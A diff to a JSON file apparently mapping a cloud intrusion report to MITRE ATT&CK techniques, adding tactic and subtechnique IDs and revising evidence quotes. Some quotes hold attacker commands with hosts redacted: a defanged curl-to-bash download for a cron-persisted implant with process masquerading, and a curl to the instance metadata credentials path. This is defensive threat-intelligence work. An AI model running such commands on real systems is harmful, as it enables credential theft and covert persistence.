@@ -22,7 +22,8 @@
           "technique_name": "Command and Scripting Interpreter: Python",
           "inferred": false,
           "evidence_quote": "The adversary leveraged the cloud provider's orchestration tool in an attempt to execute python reverse shells.",
-          "validated": false
+          "validated": false,
+          "subtechnique_id": "T1059.006"
         }
       ]
     },
@@ -34,8 +35,9 @@
           "technique_id": "T1053.003",
           "technique_name": "Scheduled Task/Job: Cron",
           "inferred": false,
-          "evidence_quote": "The adversary created a cron job to download and run the Silver implant upon reboot.",
-          "validated": false
+          "evidence_quote": "The adversary created a cron job to download and run the Silver implant upon reboot. curl hxxp://[REDACTED]... bash -c \"exec -a '[kthread/4:3-bus]'\"",
+          "validated": false,
+          "subtechnique_id": "T1053.003"
         }
       ]
     },
@@ -48,7 +50,8 @@
           "technique_name": "Cloud Instance Metadata API",
           "inferred": false,
           "evidence_quote": "The adversary attempted to harvest the cloud credentials via the Instance metadata service API. curl -k http://[REDACTED IP Address]/latest/meta-data/iam/security-credentials/[REDACTED IAM Role]",
-          "validated": true
+          "validated": true,
+          "subtechnique_id": "T1552.005"
         }
       ]
     },
@@ -69,13 +72,6 @@
           "inferred": false,
           "evidence_quote": "Additional discovery operations were observed which included querying the instance metadata service API to enumerate Identity and Access Management roles.",
           "validated": true
-        },
-        {
-          "technique_id": "T1046",
-          "technique_name": "Network Service Discovery",
-          "inferred": false,
-          "evidence_quote": "The adversary performed various discovery techniques, collecting information on network connections, running processes and system users.",
-          "validated": true
         }
       ]
     },
@@ -88,14 +84,8 @@
           "technique_name": "Remote Services: SSH",
           "inferred": false,
           "evidence_quote": "Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.",
-          "validated": false
-        },
-        {
-          "technique_id": "T1021.001",
-          "technique_name": "Remote Services: Remote Desktop Protocol",
-          "inferred": false,
-          "evidence_quote": "Utilizing the established Chisel tunnel, the adversary attempted to connect to various endpoints across ports indicating interest in SSH, RDP, SQLServer and MySQL services.",
-          "validated": false
+          "validated": false,
+          "subtechnique_id": "T1021.004"
         }
       ]
     },
@@ -114,7 +104,7 @@
           "technique_id": "T1572",
           "technique_name": "Protocol Tunneling",
           "inferred": false,
-          "evidence_quote": "Activity included attempted harvesting of cloud instance credentials and the use of Chisel to attempt protocol tunneling using an external SOCKS proxy.",
+          "evidence_quote": "The adversary executed a customer compiled version of the Chisel protocol tunneling tool to establish a reverse tunnel between the endpoint and adversary infrastructure.",
           "validated": false
         }
       ]
@@ -131,7 +121,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0001"
     },
     {
       "step": 2,
@@ -143,7 +134,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0003"
     },
     {
       "step": 3,
@@ -155,7 +147,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0007"
     },
     {
       "step": 4,
@@ -170,7 +163,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0007"
     },
     {
       "step": 5,
@@ -185,7 +179,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0006"
     },
     {
       "step": 6,
@@ -197,7 +192,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0011"
     },
     {
       "step": 7,
@@ -211,7 +207,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0002"
     },
     {
       "step": 8,
@@ -223,7 +220,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0011"
     },
     {
       "step": 9,
@@ -235,7 +233,8 @@
       "evidence_sources": [
         "https://www.dlt.com/sites/default/files/resource-attachments/2023-09/TDSPS_Oct2023_WS_2023_Cloud_risk_report.pdf"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0008"
     }
   ],
   "aws_services": [
